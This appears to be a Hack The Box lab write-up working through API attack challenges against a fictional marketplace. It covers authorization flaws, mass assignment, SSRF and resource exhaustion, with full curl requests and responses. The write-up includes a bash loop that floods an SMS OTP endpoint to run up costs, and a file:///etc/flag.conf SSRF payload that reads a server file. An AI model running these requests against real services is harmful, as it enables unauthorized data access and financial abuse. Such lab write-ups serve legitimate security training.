# HACK THE BOX MODULE - API ATTACKS 
>(for HTB CWES preperation)

## Broken Object Property Level Authorization - API Attacks

### Target: 
- **Inlanefreight E-Commerce Marketplace's API endpoints**: *94.237.52.208:45531* 
### Challenge 1 
|Authenticate to 94.237.120.233:30255 with user "htbpentester5@hackthebox.com" and password "HTBPentester5"

Exploit another Excessive Data Exposure vulnerability and submit the flag.

--
After login into htbpentester5 user account via JWT, we can check this user's roles via `GET /api/v1/roles/current-user`:
```
{
  "roles": [
    "Suppliers_Get",
    "Suppliers_GetAll",
    "SupplierCompanies_Get",
    "SupplierCompanies_GetAll"
  ]
}
```
We can see that this user has roles that allow them to see Suppliers' infomation.

With that, we can call in another API endpoint: `GET /api/v1/supplier-companie`:
```
{
  "supplierCompanies": [
    {
      "id": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "Global Solutions",
      "email": "supplier@globalsolutions.com",
      "isExemptedFromMarketplaceFee": 0,
      "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
    },
    {
      "id": "058ac1e5-3807-47f3-b546-cc069366f8f9",
      "name": "Prime Enterprises",
      "email": "supplier@primeenterprises.com",
      "isExemptedFromMarketplaceFee": 0,
      "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
    },
    
    ...
    {
      "id": "ccb287ef-83a6-423b-942a-089f87fa144c",
      "name": "HTB Academy",
      "email": "HTB{flag}",
      "isExemptedFromMarketplaceFee": 0,
      "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
    }
  ]
}

```
We found the flag: `HTB{flag}` resides in a supplier infomation.



---
### Challenge 2 
|Authenticate to 94.237.120.233:30255 with user "htbpentester7@hackthebox.com" and password "HTBPentester7" 

Exploit another Mass Assignment vulnerability and submit the flag.

--

Similar to the prior challenge, we can check our user's roles via `GET /api/v1/roles/current-user`:

```
{
  "roles": [
    "CustomerOrders_GetByID",
    "CustomerOrders_Create",
    "CustomerOrderItems_Get",
    "CustomerOrderItems_Create"
  ]
}
```
With the role *CustomerOrders_GetByID* can query to `/api/v1/customers/orders/{ID}` endpoint and get all the customer's order infomation. But we don't know any IDs yet. Same goes with `/api/v1/customers/orders/1/items` for *CustomerOrderItems_Get* role. Since we can't see any infomation yet, we will try to create customer orders.

*CustomerOrders_Create* role allows us to create new customer orders via `POST /api/v1/customers/order`

![image](https://hackmd.io/_uploads/Bkzmfs4I-x.png)

- Request:
```
curl -X 'POST' \
  'http://94.237.52.208:45531/api/v1/customers/orders' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjdAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiQ3VzdG9tZXJPcmRlcnNfR2V0QnlJRCIsIkN1c3RvbWVyT3JkZXJzX0NyZWF0ZSIsIkN1c3RvbWVyT3JkZXJJdGVtc19HZXQiLCJDdXN0b21lck9yZGVySXRlbXNfQ3JlYXRlIl0sImV4cCI6MTc2OTQxNjE1MCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.dWLKXvx6zGPJ4b6KLtCY1-wX65gDDUzPEtw95LLL634qnpjgwQt4R_iOyh2WAT0dIcodL6F3htf_pbp5ThTPKQ' \
  -H 'Content-Type: application/json' \
  -d '{
  "Date": "2026-01-26"
}'
```

- Response:
```
{
  "id": "80360c7e-dbac-4b11-b643-83a2d76ae7d4"
}
```

--> We get a new customer order `"id": "80360c7e-dbac-4b11-b643-83a2d76ae7d4"`. Using this id, we can try to create a customer order's item via `POST /api/v1/customers/orders/items`


- Request:
```
curl -X 'POST' \
  'http://94.237.52.208:45531/api/v1/customers/orders/items' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjdAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiQ3VzdG9tZXJPcmRlcnNfR2V0QnlJRCIsIkN1c3RvbWVyT3JkZXJzX0NyZWF0ZSIsIkN1c3RvbWVyT3JkZXJJdGVtc19HZXQiLCJDdXN0b21lck9yZGVySXRlbXNfQ3JlYXRlIl0sImV4cCI6MTc2OTQxNjE1MCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.dWLKXvx6zGPJ4b6KLtCY1-wX65gDDUzPEtw95LLL634qnpjgwQt4R_iOyh2WAT0dIcodL6F3htf_pbp5ThTPKQ' \
  -H 'Content-Type: application/json' \
  -d '{
  "OrderID": "80360c7e-dbac-4b11-b643-83a2d76ae7d4",
  "OrderItems": [
    {
      "ProductID": "bafaf93a-0099-44b1-b572-15b7051b8223",
      "Quantity": 0,
      "NetSum": 0
    }
  ]
}'
```

- Response:
```
{
  "SuccessStatus": false,
  "Message": "An error has occurred"
}
```
It seems like this endpoint require an actual productID to proceed. By querying to `GET /api/v1/products`, which is not restricted by role, we can get a product id (`a923b706-0aaa-49b2-ad8d-21c97ff6fac7`).


- Request:
```
curl -X 'POST' \
  'http://94.237.52.208:45531/api/v1/customers/orders/items' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjdAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiQ3VzdG9tZXJPcmRlcnNfR2V0QnlJRCIsIkN1c3RvbWVyT3JkZXJzX0NyZWF0ZSIsIkN1c3RvbWVyT3JkZXJJdGVtc19HZXQiLCJDdXN0b21lck9yZGVySXRlbXNfQ3JlYXRlIl0sImV4cCI6MTc2OTQxNzQ3OSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.XU4pcolJJrcsbW-BDC5_H8FAeUgfs80cP8DoRetbYnqtunYuKrcZDKprvAAUwZ_s3v8J0HV-4jNOhkwqG1p4RA' \
  -H 'Content-Type: application/json' \
  -d '{
  "OrderID": "80360c7e-dbac-4b11-b643-83a2d76ae7d4",
  "OrderItems": [
    {
      "ProductID": "a923b706-0aaa-49b2-ad8d-21c97ff6fac7",
      "Quantity": 1,
      "NetSum": 1
    }
  ]
}'
```

- Response:
```
{
  "SuccessStatus": true,
  "Message": "HTB{flag}"
}
```

=> By successfully creating a new order item, we managed to find the flag `HTB{flag}`.


---
## Unrestricted Resource Consumption
### Target: 
- **Inlanefreight E-Commerce Marketplace's API endpoints**: *94.237.52.208:45531* 

Exploit another Unrestricted Resource Consumption vulnerability and submit the flag.

--
Login credentials: `htbpentester8@pentestercompany.com:HTBPentester8`. Use the credential to login via `/api/v1/authentication/suppliers/sign-in` as a supplier account.

After login in, we can check user's roles just like how we did previously

```
{
  "roles": [
    "SupplierCompanies_Get",
    "SupplierCompanies_UploadCertificateOfIncorporation"
  ]
}
```
- This part is already mentioned and demonstrated in the example.

- Exploiting endpoint: `api/v1/authentication/customers/passwords/resets/sms-otps` 
 ![image](https://hackmd.io/_uploads/SJIFJnELZx.png)
 | *The SMS provider we are working with charges us a significant amount per message.* 
 => Which mean that we can abuse this endpoint by spamming request, forcing an astronomical financial burden on the them.
 
```
for i in $(seq 1 100); 
do curl -X 'POST' \
'http://94.237.52.208:45531/api/v1/authentication/customers/passwords/resets/sms-otps' \
-H 'accept: application/json' \
-H 'Content-Type: application/json' \
-d '{
  "Email": "htbpentester8@pentestercompany.com"
}'; \

done

```
- Response
```
{"SuccessStatus":false}
{"SuccessStatus":false}
...
{"flag":"HTB{flag}"}

(I need to write a better bash script bruh :p)
```

After an amount of repetition, it finally response with the flag.

---

## Broken Function Level Authorization
* **BFLA** is different from **BOLA**: **BOLA** is when user is authorized to that infomation when **BFLA** isn't.

* We need to hunt for endpoints that require authorization but allow unauthorized users to interact with them. 

* Pretty much hunting for a/some unrestricted API endpoint(s) without any roles assigned despite what
it/they were supposed to have.

### Target:
- **Inlanefreight E-Commerce Marketplace's APIs**:*94.237.50.128:33339* 


    Authenticate to with user         "htbpentester9@hackthebox.com" and password "HTBPentester9"

    Exploit another Broken Function Level Authorization vulnerability and submit the flag.
    
--
We start out similarly with what we have done previously by logging in with our credentials via `POST /api/v1/authentication/customers/sign-in` to get our JWT and getting authorized.

By checking the account's roles via `/api/v1/roles/current-user`, we can confirm that this account has no assigned roles
![image](https://hackmd.io/_uploads/BJE8oQPLbl.png)

Before we can start finding, we need to look at what API endpoints this account is and isn't suppose to access:

	1. Any API endpoint that has 'current-user' is obviously accessible by our user
	2. Any endpoint that requires inputs can be crossed out since we lack the neccessary info to use them. (unless provided/found)

After eliminating every out-of-scope endpoints, we can now start hunting for the vulnerable one(s), and soon enough, we found the endpoint `GET /api/v1/customers/billing-addresses` being vulnerable to BFLA.![image](https://hackmd.io/_uploads/BkQzJEDLZl.png)
Supposedly, this endpoint is restricted for users with the role *CustomerBillingAddresses_GetAll* but when we send the request, we can get an actual response and not 'Forbidden':

Response body:
```
{
  "customersBillingAddresses": [
    {
      "customerID": "fe4a4b39-3df6-425a-9525-a7b2914f711b",
      "city": "Esbjerg",
      "country": "Denmark",
      "street": "851 Kongensgade",
      "postalCode": 76079
    },
    {
      "customerID": "3589e7f7-2d8a-4873-8bd9-b2c20b7a0ad2",
      "city": "Zurich",
      "country": "Switzerland",
      "street": "992 Bahnhofstrasse",
      "postalCode": 11746
    },
    {
      "customerID": "a0683cc9-a71f-4957-8fbb-45ead732040e",
      "city": "Fier",
      "country": "Albania",
      "street": "787 Bulevardi Dëshmorët e Kombit",
      "postalCode": 64633
    },
    ...
    {
      "customerID": "9076351f-e6b8-4445-84e3-72800c79dd1d",
      "city": "Kent",
      "country": "England",
      "street": "HTB{flag}",
      "postalCode": 19553
    },
    ...
}
```
=> We found a flag hidden beneath the repsonse.

---
## Unrestricted Access to Sensitive Business Flows
- An extension of BFLA, leading to a business logic bug.


### Target:
- **Inlanefreight E-Commerce Marketplace's APIs**:*94.237.50.128:33339*  
-  Authenticate to 94.237.50.128:33339 with user "htbpentester9@hackthebox.com" and password "HTBPentester9"

    Based on the previous vulnerability, exploit the Unrestricted Access to Sensitive Business Flow vulnerability and submit the street address where the user with the ID 'daa8c984-ba84-4265-8d88-12d6607e511c' lives.
    
--
Continue from last chapter, we take a look at the response to find the address of user with the ID 'daa8c984-ba84-4265-8d88-12d6607e511c'.

Response body:
```
...
    {
      "customerID": "daa8c984-ba84-4265-8d88-12d6607e511c",
      "city": "Glasgow",
      "country": "UK",
      "street": "{Street address}",
      "postalCode": 63103
    },
...
```
=> We found the street address as the flag.

---
## Server Side Request Forgery
- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
![image](https://hackmd.io/_uploads/r11B84vUWx.png)
- In short, **SSRF** is when the Web Server retrieve untrusted data as source and serve its contents as a result.

### Target:
- **Inlanefreight E-Commerce Marketplace's APIs**:*94.237.50.128:33339*
- Authenticate to 94.237.50.128:33339 with user "htbpentester11@pentestercompany.com" and password "HTBPentester11"

    Exploit another Server Side Request Forgery vulnerability and submit the contents of the file '/etc/flag.conf'.
--
For this challenge, we login as a supplier account 
`POST /api/v1/authentication/suppliers/sign-in`.

As per usual, we check this account for its roles:

Response body:
```
{
  "roles": [
    "SupplierCompanies_Update",
    "SupplierCompanies_UploadCertificateOfIncorporation",
    "Products_CreateByCurrentUser",
    "Products_Update",
    "Products_UploadPhoto"
  ]
}
```

The roles give us access to (in this particular order):
- `PATCH /api/v1/supplier-companies`
- `POST api/v1/supplier-companies/certificates-of-incorporation`
- `POST /api/v1/products/current-user`
- `PATCH /api/v1/products`
- `POST /api/v1/products/photo`

We can see that there are 2 possible ways to perform a SSRF to LFI attack:

1. Products 
- Create a new product via `POST /api/v1/products/current-user`.
    - Request body:
    ```
	{
	  "NewProduct": {
	    "Name": "SSRF2LFI",
	    "Price": 67,
	    "PNGPhotoFileURI": ""
	  }
	}
    ```
    - Response body:
    ```
    {
      "successStatus": true,
      "productID": "0828be90-8529-4a65-a87f-794fd0d18c6b"
    }
    
    ```
- Change the product's infomation so that `PNGPhotoFileURI` points to a `/etc/flag.conf`
    - Request body:
    ```
	{
	  "UpdatedProduct": {
	    "SupplierID": "5d489453-3538-4973-9479-2c37b2a5db73",
	    "ProductID": "0828be90-8529-4a65-a87f-794fd0d18c6b",
	    "Name": "SSRFtoLFI",
	    "Price": 67,
	    "PNGPhotoFileURI": "file:///etc/flag.conf"
	  }
	}
    ```
    - Response body:
    ```
    {
        "SuccessStatus": true
    }
    ```

- Finally, we can check if the product's photo was changed using `GET /api/v1/products/{Our_product_ID}/photo`

    - Response body:
    ```
    {
      "successStatus": true,
      "base64Data": "SFRCe2ZsYWd9="
    }
    ```
- Decode the base64Data field and we'll get our flag: `HTB{flag}`.

2. Supplier companies
*Similar to the module example.*

---

